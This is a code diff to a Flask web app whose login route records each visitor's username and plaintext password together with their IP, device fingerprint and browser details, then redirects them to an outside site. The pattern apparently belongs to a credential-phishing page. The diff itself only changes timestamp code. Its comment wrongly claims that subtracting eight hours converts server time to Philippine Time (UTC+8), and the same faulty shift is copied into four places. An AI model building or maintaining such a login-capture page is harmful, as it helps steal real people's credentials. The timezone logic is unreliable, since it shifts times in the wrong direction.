@@ -8,7 +8,7 @@ import re
 import json 
 import hashlib
 import uuid
-from datetime import datetime
+from datetime import datetime, timedelta
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)  # Required for session
@@ -53,11 +53,13 @@ def login():
     device_fingerprint = generate_device_fingerprint()
     browser_info = get_browser_info()
     
-    # Get exact current time in 12-hour format
-    # This should reflect the exact time when the login occurs
-    timestamp = datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')
+    # Get current time and adjust for Philippine timezone (UTC+8)
+    # If the server time is showing as UTC, we need to subtract 8 hours for it to show PHT correctly
+    now = datetime.now()
+    adjusted_time = now - timedelta(hours=8)
+    timestamp = adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p')
     
-    # Save the data with the exact timestamp
+    # Save the data with the adjusted timestamp
     save_full_data("", "", username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info)
     
     # Redirect to external site
@@ -332,9 +334,10 @@ def update_last_modified_timestamp(csv_path=None):
         script_dir = os.path.dirname(os.path.abspath(__file__))
         timestamp_file = os.path.join(script_dir, 'last_modified.txt')
         
-        # Get the exact current time in 12-hour format
-        # This should be the actual system time
-        current_time = datetime.now().strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
+        # Adjust for timezone difference (-8 hours)
+        now = datetime.now()
+        adjusted_time = now - timedelta(hours=8)
+        current_time = adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
         
         # Write timestamp to file
         with open(timestamp_file, 'w') as f:
@@ -356,14 +359,21 @@ def get_last_modified_timestamp():
         csv_path = os.path.join(script_dir, 'data.csv')
         if os.path.exists(csv_path):
             modified_time = os.path.getmtime(csv_path)
-            # Get actual modification time without timezone adjustments
-            return datetime.fromtimestamp(modified_time).strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
+            # Adjust for timezone difference (-8 hours)
+            timestamp_dt = datetime.fromtimestamp(modified_time)
+            adjusted_time = timestamp_dt - timedelta(hours=8)
+            return adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
         
-        # If all else fails, return current time
-        return datetime.now().strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
+        # If all else fails, return current time adjusted for timezone
+        now = datetime.now()
+        adjusted_time = now - timedelta(hours=8)
+        return adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
     except Exception as e:
         print(f"Error getting timestamp: {str(e)}")
-        return datetime.now().strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
+        # Return current time adjusted for timezone
+        now = datetime.now()
+        adjusted_time = now - timedelta(hours=8)
+        return adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
 
 # Add a route to view statistics with access key protection
 @app.route('/stats/<access_key>', methods=['GET'])
